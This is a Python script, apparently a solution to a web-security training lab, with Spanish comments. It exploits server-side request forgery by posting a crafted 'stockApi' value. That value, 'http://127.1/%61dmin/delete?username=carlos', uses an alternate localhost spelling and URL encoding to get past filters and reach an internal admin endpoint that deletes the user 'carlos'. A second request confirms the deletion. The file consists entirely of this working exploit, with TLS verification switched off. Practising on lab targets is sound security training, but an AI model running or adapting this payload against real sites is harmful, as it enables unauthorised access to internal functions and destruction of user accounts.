import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1','https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) !=2:
        print(f"(+) Uso: {sys.argv[0]} <url>")
        print(f"(+) Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    base_url = sys.argv[1]
    print("(+) Eliminando usuario carlos...")
    delete_user(base_url)

def delete_user(base_url):
    url_stock = f"{base_url}/product/stock"
    ssrf_payload = "http://127.1/%61dmin/delete?username=carlos"
    data_stockapi = {'stockApi': ssrf_payload}
    response = requests.post(url_stock,data=data_stockapi, verify=False,proxies=proxies_setting)
    
    """Valido si el usuario fue eliminado"""
    ssrf_payload2 = "http://127.1/%61dmin"
    data_stockapi = {'stockApi': ssrf_payload2}
    response2 = requests.post(url_stock, data=data_stockapi,verify=False,proxies=proxies_setting)
    if "User deleted successfully" in response2.text:
        print("(+) Usuario carlos eliminado")
    else:
        print("(-) No fue posible eliminar el usuario carlos")

if __name__ == "__main__":
    main()
